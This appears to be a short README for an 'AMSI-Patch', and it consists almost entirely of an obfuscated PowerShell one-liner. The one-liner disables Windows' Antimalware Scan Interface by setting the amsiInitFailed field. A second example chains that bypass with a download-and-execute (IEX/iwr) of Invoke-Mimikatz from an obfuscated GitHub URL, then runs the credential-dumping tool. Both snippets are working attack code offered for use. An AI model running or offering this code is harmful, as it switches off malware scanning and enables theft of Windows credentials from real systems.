# AMSI-Patch

```$x = 'si'; $c = 'Am'; $Ref = [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $c, $x)); $z = $Ref.GetField(('am{0}InitFailed' -f $x),'NonPublic,Static'); $z.("Set" + "Value")($null,$true)```

# Example (Invoke-Mimikatz)

```$x = 'si'; $c = 'Am'; $Ref = [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $c, $x)); $z = $Ref.GetField(('am{0}InitFailed' -f $x),'NonPublic,Static'); $z.("Set" + "Value")($null,$true); IEX (iwr -UseBasicParsing "https://raw.githubusercontent.com/die#vus/PowerShellFo#rPentes#ters/ma#in/Tool#s/Invo#ke-#Mimik#atz.p#s1".replace("#", "")); .("Invoke"+ "-Mimikatz")```
